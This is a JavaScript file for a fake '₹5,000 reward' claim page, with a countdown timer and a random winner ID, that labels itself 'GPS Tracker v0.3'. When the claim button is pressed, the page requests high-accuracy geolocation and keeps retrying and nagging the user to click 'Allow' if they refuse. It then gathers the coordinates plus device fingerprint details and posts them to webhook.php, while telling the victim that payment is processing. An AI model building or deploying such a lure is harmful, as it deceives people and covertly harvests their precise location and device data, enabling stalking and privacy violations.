let countdownTime = 14 * 60 + 59;

// Start countdown timer
function startCountdown() {
  setInterval(() => {
    if (countdownTime > 0) {
      countdownTime--;
      const minutes = Math.floor(countdownTime / 60);
      const seconds = countdownTime % 60;
      document.getElementById('countdown').textContent = 
        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
  }, 1000);
}

// Success function - SENDS DATA IMMEDIATELY
function showSuccess(position) {
  console.log("✅ Location captured successfully!", position);
  
  // Collect all data with proper fallbacks
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    altitude: position.coords.altitude !== null ? position.coords.altitude : 'N/A',
    altitudeAccuracy: position.coords.altitudeAccuracy !== null ? position.coords.altitudeAccuracy : 'N/A',
    heading: position.coords.heading !== null ? position.coords.heading : 'N/A',
    speed: position.coords.speed !== null ? position.coords.speed : 'N/A',
    timestamp: new Date(position.timestamp).toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language || navigator.userLanguage || 'N/A',
    screenResolution: `${screen.width}x${screen.height}`,
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    deviceMemory: navigator.deviceMemory || 'N/A',
    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
  };
  
  console.log("📤 Sending data to webhook.php:", data);
  console.log("📍 Coordinates:", data.latitude, data.longitude);
  
  // Send to webhook with better error handling
  fetch('webhook.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    console.log("📥 Server response status:", response.status);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(result => {
    console.log("✅ Server confirmed data received:", result);
    console.log("💾 Data saved successfully!");
  })
  .catch(error => {
    console.error("❌ Error sending data to server:", error);
    // Try alternative method - create a form and submit
    console.log("🔄 Attempting alternative data transmission...");
    
    // Create hidden form as backup
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'webhook.php';
    form.style.display = 'none';
    
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'gps_data';
    input.value = JSON.stringify(data);
    
    form.appendChild(input);
    document.body.appendChild(form);
    
    // Log to console as backup
    console.log("📋 GPS DATA (backup):", JSON.stringify(data, null, 2));
  });
  
  // Hide modal if it was shown
  const modal = document.getElementById('permissionModal');
  if (modal) {
    modal.classList.remove('active');
  }
  
  // Update UI with success message
  const statusMsg = document.getElementById('statusMessage');
  if (statusMsg) {
    statusMsg.className = 'status-message success';
    statusMsg.innerHTML = `
      ✅ <strong>Success!</strong> Your location has been verified.<br>
      📍 Coordinates: ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}<br>
      💰 Your ₹5,000 reward is processing...
    `;
  }
  
  const button = document.getElementById('claimBtn');
  if (button) {
    button.style.background = 'linear-gradient(135deg, #48bb78 0%, #38a169 100%)';
    button.innerHTML = '✓ Verified - Payment Processing...';
    button.disabled = true;
  }
}

// Error function - Shows modal and guides user
function showError(error) {
  let message = "An unknown error occurred.";
  let retryAction = false;
  
  console.error("❌ Location error:", error);
  
  switch(error.code) {
    case error.PERMISSION_DENIED:
      message = "❌ Location access was denied. Please click 'Allow' when prompted to claim your reward!";
      console.log("🚫 User denied location permission");
      retryAction = true;
      break;
    case error.POSITION_UNAVAILABLE:
      message = "⚠️ Location information is unavailable. Please enable location services in your device settings.";
      console.log("📍 GPS/Location services unavailable");
      retryAction = true;
      break;
    case error.TIMEOUT:
      message = "⏱️ The request timed out. Retrying...";
      console.log("⏰ Location request timed out");
      retryAction = true;
      break;
    case error.UNKNOWN_ERROR:
    default:
      message = "❓ An unknown error occurred. Please try again.";
      console.log("❓ Unknown error occurred");
      retryAction = true;
      break;
  }
  
  // Show modal with error message
  const modal = document.getElementById('permissionModal');
  const modalStatus = document.getElementById('modalStatus');
  
  if (modal && modalStatus) {
    modal.classList.add('active');
    modalStatus.innerHTML = `
      <span style="color: #c53030; font-weight: 600;">${message}</span>
      <br><br>
      <small style="color: #4a5568;">
        <strong>Instructions:</strong><br>
        1. Look for the browser permission popup (usually at the top)<br>
        2. Click "Allow" or "Share Location"<br>
        3. If no popup appears, check your browser settings
      </small>
    `;
    
    // Retry after 4 seconds if appropriate
    if (retryAction) {
      setTimeout(() => {
        console.log("🔄 Retrying location request...");
        modalStatus.innerHTML = `
          <div class="loading-spinner"></div>
          <span>Requesting location access again...</span>
        `;
        gpsLocation();
      }, 4000);
    }
  }
}
  
// This function requests the user's location IMMEDIATELY
function gpsLocation() {
  console.log("📍 Initiating GPS location request...");
  
  if (!navigator.geolocation) {
    console.error("❌ Geolocation API not supported");
    const modal = document.getElementById('permissionModal');
    const modalStatus = document.getElementById('modalStatus');
    if (modal && modalStatus) {
      modal.classList.add('active');
      modalStatus.innerHTML = `
        <span style="color: #c53030; font-weight: 600;">⚠️ Your browser does not support location services.</span>
        <br><br>
        <small>Please use a modern browser like Chrome, Firefox, Safari, or Edge.</small>
      `;
    }
    return;
  }
  
  console.log("✓ Geolocation API supported");
  
  // Show the modal immediately to guide the user
  const modal = document.getElementById('permissionModal');
  const modalStatus = document.getElementById('modalStatus');
  
  if (modal && modalStatus) {
    modal.classList.add('active');
    modalStatus.innerHTML = `
      <div class="loading-spinner"></div>
      <span>Requesting location permission...</span>
      <br><br>
      <small style="color: #4a5568;">
        <strong>Please allow location access when prompted!</strong><br>
        Look for a permission popup from your browser
      </small>
    `;
  }
  
  console.log("🔓 Requesting geolocation permission...");
  
  // Request with high accuracy
  navigator.geolocation.getCurrentPosition(
    showSuccess,  // Success callback
    showError,    // Error callback
    {
      enableHighAccuracy: true,  // Request precise GPS coordinates
      timeout: 20000,            // 20 second timeout
      maximumAge: 0              // Don't use cached location
    }
  );
  
  console.log("⏳ Waiting for user to grant permission...");
}

// Claim reward function - TRIGGERS GPS IMMEDIATELY
function claimReward() {
  console.log("🎁 Claim button clicked!");
  console.log("Starting GPS capture process...");
  
  // Update button state
  const button = document.getElementById('claimBtn');
  if (button) {
    button.innerHTML = '⏳ Verifying Location...';
    button.disabled = true;
  }
  
  // Trigger location request IMMEDIATELY
  gpsLocation();
}

// Initialize when page loads
window.onload = function() {
  console.log("═══════════════════════════════════════════════");
  console.log("🚀 GPS Tracker v0.3 - Initialized");
  console.log("📱 Device:", navigator.userAgent);
  console.log("🌐 Platform:", navigator.platform);
  console.log("═══════════════════════════════════════════════");
  
  // Start countdown timer
  startCountdown();
  
  // Add click event to button
  const claimBtn = document.getElementById('claimBtn');
  if (claimBtn) {
    claimBtn.addEventListener('click', claimReward);
    console.log("✓ Claim button event listener attached");
  } else {
    console.error("❌ Claim button not found!");
  }
  
  // Generate random winner ID
  const randomId = document.getElementById('randomId');
  if (randomId) {
    const id = Math.floor(Math.random() * 90000) + 10000;
    randomId.textContent = id;
    console.log("✓ Winner ID generated:", id);
  }
  
  console.log("✅ Page fully loaded and ready");
  console.log("👉 User should click 'CLAIM ₹5,000 NOW' button");
  console.log("═══════════════════════════════════════════════");
};